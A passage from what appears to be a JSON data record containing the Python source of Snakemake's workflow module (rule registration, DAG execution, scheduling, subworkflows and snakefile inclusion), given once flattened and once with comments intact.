already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n 